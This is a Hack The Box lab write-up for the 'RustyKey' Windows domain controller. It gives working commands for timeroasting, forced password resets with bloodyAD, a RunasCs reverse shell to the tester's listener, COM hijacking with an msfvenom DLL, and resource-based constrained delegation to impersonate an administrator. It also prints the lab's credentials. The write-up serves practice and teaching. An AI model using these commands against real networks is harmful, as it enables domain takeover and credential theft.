---
title: 'HTB-RustyKey'
published: 2025-07-03
draft: false
toc: true
tag: ["pass-the-ticket", "pass-the-key", "timeroasting", "BloodyAD", "BloodHound", "AddSelf", "forcechangepassword", "COM-hijack", "RBCD"]
---

```
Scope:
10.10.11.75

Creds:
rr.parker / 8#t5HE8L!W3A
```

# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -vvvv -p- -T5 --min-rate=5000 -Pn rusty.htb

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-07-04 03:14:33Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
49727/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-04T03:15:25
|_  start_date: N/A
|_clock-skew: 8h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 51928/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 22945/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 63867/udp): CLEAN (Failed to receive data)
|   Check 4 (port 40875/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

## Pass the Key - TGT

This was unsuccessful with the current user creds:

![](attachments/cf7d49d4ce434753e76a31328c3ea579.png)

`bloodhound-ce-python` didn't work either:

![](attachments/dff6c5f08ccef98bf91f145f15cfc5c7.png)

So what now? 

![](attachments/c846cf387a1552b6b2a8ffc613f69f38.png)

But first I had to make some quick changes in the `/etc/krb5.conf` file:

![](attachments/2bf0c421361730dbfebeb99645490e84.png)

![](attachments/79f36431b8bfa851fa26a170627617b0.png)

I can now fix the clock skew and get the `tgt`:

```bash
impacket-getTGT 'rustykey.htb/rr.parker' -dc-ip 10.10.11.75
```

![](attachments/3b2d3f57593e7116f69f88e76deba31b.png)

![](attachments/9d301960880c20a41b36c7f4e71f29b2.png)

### BloodHound

Time to do some enumeration:

```bash
echo "10.10.11.75 dc.rustykey.htb" | sudo tee -a /etc/hosts 

bloodhound-ce-python -u rr.parker -p '8#t5HE8L!W3A' -ns 10.10.11.75 -c all -k -d rustykey.htb
```

![](attachments/c8c5c15eaaf2f61716cc55d24e6a098e.png)

Now I can start graphing it out.

![](attachments/b7fad91e0fe4c29ffede7535250f6ac2.png)

:::note
I couldn't really find anything useful for now, but I will definitely come back here
:::

### User Enum

I then proceded by using `nxc` in conjuncture with `ldap` in order to enumerate all the users on the domain:

```bash
nxc ldap rustykey.htb -u users.txt -p passwords.txt --users -k
```

![](attachments/0e89d23671affadb925cbb4a79329d2e.png)

:::note
The *backupadmin* user stands out immediately, that might be our priv esc later on.
:::

I added all of the above for my users list.

### Timeroasting

So after being stuck on this part I went on and checked out some resources online on what I could do next. Here I found [this article](https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac) on *timeroasting* which I've never heard of before:

![](attachments/862f8ed44915bb5e2f34e000c38ee4f9.png)

Very interesting read, to set up my attack I found [this GitHub repo](https://github.com/SecuraBV/Timeroast) containing a `python` script:

![](attachments/b9be8575594e175eb1e6d6e47233d7e8.png)

I could run the command easily as follows:

```bash
python3 timeroast.py rustykey.htb
```

![](attachments/e9128ce13de1210d4b4a174e6ca95737.png)

I went ahead and put these in a file and started cracking.

### Hashcat (beta)

In order to crack this I needed a beta module of `hashcat` which included mode `31300` that could crack this hash format:

![](attachments/7d0e842934979245c154d25f73b70328.png)

:::note
I could easily find it [here](https://hashcat.net/beta/).
:::

After unzipping the file I started cracking.

![](attachments/6568b4345fcbe57608a6f91121fb3b10.png)

```
Rusty88!
```

### Finding Corresponding Object ID

I now had a list of computers that I found through *timeroasting*:

![](attachments/a13470e32c0c327e95bca89ea230bd04.png)

I could check `bloodhound` and see which computers these Object ID's belong to:

![](attachments/958dbf0694c831373d249b569089a4c4.png)

I started enumerating them and found the cracked Object ID inside `IT/COMPUTERS/COMPUTER-3`:

![](attachments/09bb6820cfd17d4c4010ff66e8ba950e.png)

Now I could add this computer to my list of owned principals.

![](attachments/c6170c0a794664c7d1acad45c3e26846.png)

I noticed that I could add myself to the **HELPDESK** group.

![](attachments/240832bb7cd48563582ec89db75aa5d3.png)

### AddSelf

I tried it out using `bloodyAD` but got this error:

![](attachments/04d9fc9b10eb6f8c502121b840b1e05a.png)

:::fail
On closer inspection it makes sense that it failed:
Machine accounts **can’t authenticate via NTLM directly** like regular user accounts _in most cases_—they are designed to use **Kerberos tickets** (machine authentication requires a valid TGT).
:::

So, we need to request a TGT again.

```bash
impacket-getTGT 'rustykey.htb/IT-COMPUTER3$' -dc-ip 10.10.11.75
```

![](attachments/f996d883d66f9fd5c8aca001b5f0ae32.png)

![](attachments/1d2229aa7c053796b9c1890f5c86b94b.png)

I retried the previous command with `-k` but got this error:

![](attachments/da5d134d89bf93d50028589038af7a39.png)

I had to specify the `host` in this case, the full command looks as follows:

```bash
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-COMPUTER3$'
```

![](attachments/0d231b4ddcd58f4f768d001ae63ef93a.png)

Great! I was able to add myself to the **HELPDESK** group, I can now move on to the next step.

![](attachments/1831c0663a90e73495de51adea1b3855.png)

I'd like to exploit *bb.morgan* in order to get RCE, however the following is bugging me:

![](attachments/48d1be60480908ba212aec980abe6a78.png)

The **PROTECTED OBJECTS** group might LIKELY interfere in this process. 

![](attachments/0353fc2d33644dbca87a3bdb0755d9f0.png)

Let's try it out.

### ForceChangePassword - bb.morgan

![](attachments/d60a2baf4eeab1402159d33616b00e1d.png)

I can easily change the password so that's good.

```
bb.morgan
password123!
```

:::important
We now will have to get another `kerb` ticket in order to actually log in:
![](attachments/9085e18175ee36f72654fe3216fb3e00.png)
:::

Simply requesting the ticket does not work:

![](attachments/6b9b709e7bc28ec787c19d8947ac28da.png)

This might in fact be due to the constraints of the **PROTECTED OBJECTS** group. Let's remove our user from it.

:::danger
Sometimes it trips out and you'll have to repeat old commands again:
![](attachments/258a1db790a792d9b78048ccf5fbf369.png)
:::

After resending the `add groupMember` command I issued the `remove groupMember` command for the **PROTECTED OBJECTS** group:

```bash
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'IT'
```

![](attachments/26c3b1865a1489067038808dbb0f66ac.png)

And now I can send the password change and TGT commands again:

```bash
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password 'bb.morgan' 'P@ssword123!'

impacket-getTGT 'rustykey.htb/bb.morgan':'P@ssword123!' -dc-ip 10.10.11.75
```

![](attachments/e492c44938260a9593d59fd74d21b7d1.png)

# Foothold
## Shell as bb.morgan

First I export the `kerberos` ticket and log into `winrm` via the same terminal.

![](attachments/09648c57aa802d82fd710dd433ec3ed0.png)

And now I can go ahead and login via `evil-winrm`:

![](attachments/b12c7bd2fb256d3d015965046ec87ee4.png)

### user.txt

![](attachments/61264ee6a0d3e29a7461be9a3a20d25d.png)

## Enumeration

Furthermore I find the following:

![](attachments/93201e015384b3ab2490d823a3602b01.png)

:::note
Other than that my privs are absolutely dog tier:
![](attachments/4bcbd2466dad986bb51ec75057e155fb.png)
:::

![](attachments/25b5b3a86cefa01bb60e67472687d247.png)

### PDF

![](attachments/7948c91e5d74ea2ba2f762d6189e50fe.png)

Looks like we need to move Laterally to a member of the **SUPPORT** group in order to take advantage of this situation.

![](attachments/3a4a1ee7c1d70396ef5d244cd24caa95.png)

We'll have to remove the group from the **PROTECTED OBJECTS** first of all, then *ForceChange* the password of *ee.reed*.

## Lateral Movement
### ForceChangePassword - ee.reed

```bash
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-COMPUTER3$'
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' 'SUPPORT'
```

![](attachments/9b62d98e3693b23d5f1ef882e6b29ccf.png)

```bash
bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password 'ee.reed' 'P@ssword123!'
impacket-getTGT 'rustykey.htb/ee.reed':'P@ssword123!' -dc-ip 10.10.11.75
```

![](attachments/3083b9db9320e9f53aed933eb4a1d902.png)

However this is where I ran into a problem:

![](attachments/d728ae29eccd6d1e988ca23b3f014ae4.png)

Eventhough I changed the password correctly and exported the ticket I could still not login.

### RunasCs

I downloaded the `runascs` binary and downloaded it over to the target:

![](attachments/97de8eb6483173df3e53f3558d213a5a.png)

![](attachments/fbfc2dea9944525d55a3fe577afd6748.png)

I set up a listener:

![](attachments/cb05bd5c65aba3dd630cdd15f73cc835.png)

I then executed the binary as follows:

```bash
.\RunasCs.exe ee.reed P@ssword123! powershell -r 10.10.14.17:4444
```

![](attachments/6a22981c33e5e0f697f4865c77939577.png)

I got a shell:

![](attachments/311b21d4dda6cf9d44e2dbbb4db28869.png)

:::success
I successfully pivoted to *ee.reed*.
:::

I checked back on `bloodhound` and found that the way to get to *backupadmin* was by exploiting *mm.turner* first:

![](attachments/e851400522bf2295f52467a6890dae7a.png)

:::note
I had to move laterally towards *mm.turner* first, my guess would be via the following methods.
:::

I focus in on this part that I found in the PDF.

![](attachments/3291bfe270b5ce9a439ad19ec609cc50.png)

:::important
- COM objects for **ZIP utilities** (or compression tools) often register CLSIDs with the term "zip".
- Many archiving tools (WinRAR, 7-Zip, built-in ZIP) register COM objects to integrate into context menus (right-click options like "Extract Here", "Compress", etc.).
- If such registry keys are **writable by low-privileged users** (due to the "extended access"), an attacker can **redirect** the CLSID to load _malicious DLLs_ or _payloads_ instead—this is **COM Hijacking**.
:::

If writable, attackers can:

- Replace `InprocServer32` path to point to **malicious DLL**.
- Trigger the vulnerable app or COM call → DLL gets loaded as SYSTEM or elevated context.

Result: **Privilege Escalation via COM Hijack**.

## COM Hijack
### Registry

I went ahead to query the `reg` and view what I could find.

```bash
reg query HKCR\CLSID /s /f "zip"
```

![](attachments/9b80db57a1b1eb3e04f38aebac2f19f5.png)

I went ahead and reviewed the ACL's on the `InprocServer32`:

```powershell
Get-Acl -Path "Registry::HKEY_CLASSES_ROOT\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" | Format-List
```

![](attachments/8341dcc915bacf44c74369d7a80214da.png)

This looks perfect for us, let's construct a `.dll` payload via `msfvenom` which will be used to hijack `InprocServer32`.

### Overwriting InprocServer32

![](attachments/3cf89de90ffe92a33061c95664868baa.png)

After craftig up the payload I can now upload it.

![](attachments/0e0bcbe96bc4e6bd01651430a8e21b9a.png)

```shell
reg add "HKLM\Software\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /d "C:\tools\hax2.dll" /f
```

:::important
The `.dll` payload needs to be put in a location where *every* user has access to it! Otherwise it will not work.
:::

![](attachments/6266c8fe4afe5aeefc0a8d449f1e4cb5.png)

Now that we have access as *mm.turner* we can move on to the next part.

![](attachments/4bea705696792a8616163158578d4f40.png)

It looks like we'll have to do some delagation magic.

# Privilege Escalation
## Resource Based Constrained Delegation (RBCD)

I'll start off with the following command:

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
```

![](attachments/6cb425ba7928b4a702f34a8ffff1006a.png)

I then went ahead and used `impacket-getST` to get the service ticket for *backupadmin*:

```bash
impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip 10.10.11.75 -k 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
```

![](attachments/c6a0c3db5df767612725e3b4b6cafb75.png)

I can now export it and get access with it.

![](attachments/133f6c53537acb6f491726e77c7fb96e.png)

### root.txt

![](attachments/c608d96e5c3fdc71e4854d1e66524745.png)

![](attachments/3c9c48cc4111c93c4b672d923f2b4541.png)

---